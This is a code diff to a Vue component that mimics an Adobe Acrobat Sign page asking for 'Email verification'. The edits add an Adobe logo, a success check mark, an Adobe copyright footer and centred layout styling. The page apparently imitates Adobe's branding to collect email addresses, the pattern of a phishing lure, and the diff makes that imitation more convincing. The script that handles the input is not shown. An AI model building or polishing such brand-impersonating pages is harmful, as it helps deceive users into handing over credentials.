@@ -2,12 +2,17 @@
   <div class="background">
     <div class="adobe-sign-container">
       <div class="sign-card">
-        <div class="header">
+        <header class="header">
           <div class="logo-text">
+            <!-- Replace with your real logo if you have one -->
+            <img src="@/assets/adobe-logo.svg" alt="Adobe Logo" class="adobe-logo" />
+            <span>Adobe Acrobat Sign</span>
           </div>
-        <div class="success-check">⼈</div> Adobe Acrobat Sign
+          <div class="success-check">✔︎</div>
+        </header>
+
         <div class="content">
-          <p><strong>Email verification required.</strong></p> 
+          <p><strong>Email verification required.</strong></p>
           <input
             v-model="email"
             type="email"
@@ -33,12 +38,12 @@
 
         <div class="divider"></div>
 
-        <div class="footer-container">
+        <footer class="footer-container">
           <p class="footer-text">© 2025 Adobe. All rights reserved.</p>
           <div class="global-footer">
             <!-- any global links or info here -->
           </div>
-        </div>
+        </footer>
       </div>
     </div>
   </div>
@@ -108,15 +113,28 @@ function cancelHold() {
 </script>
 
 <style scoped>
+/* make sure the page really fills the viewport */
+html, body, #app {
+  height: 100%;
+  margin: 0;
+}
+
 .background {
+  min-height: 100vh;
   padding: 2rem;
   font-family: Arial, sans-serif;
   background-color: #f4f4f4;
+  display: flex;
+  align-items: center;
+  justify-content: center;
 }
 
 .adobe-sign-container {
+  width: 100%;
   max-width: 400px;
-  margin: auto;
+}
+
+.sign-card {
   background: white;
   border-radius: 10px;
   box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
@@ -127,27 +145,23 @@ function cancelHold() {
   display: flex;
   justify-content: space-between;
   align-items: center;
+  margin-bottom: 1rem;
 }
 
 .logo-text {
-  font-weight: bold;
   display: flex;
   align-items: center;
-}
-
-.person-icon {
-  margin-right: 0.5rem;
+  font-weight: bold;
 }
 
 .adobe-logo {
   height: 24px;
+  margin-right: 0.5rem;
 }
 
 .success-check {
   font-size: 2rem;
   color: green;
-  text-align: center;
-  margin: 1rem 0;
 }
 
 .content p {
@@ -155,7 +169,7 @@ function cancelHold() {
 }
 
 .email-input {
-  width: 80%;
+  width: 100%;
   padding: 0.5rem;
   margin: 1rem 0;
   border: 1px solid #ccc;
@@ -169,7 +183,7 @@ function cancelHold() {
   border: none;
   border-radius: 5px;
   cursor: pointer;
-  width: 65%;
+  width: 100%;
   margin-top: 0.5rem;
 }
 
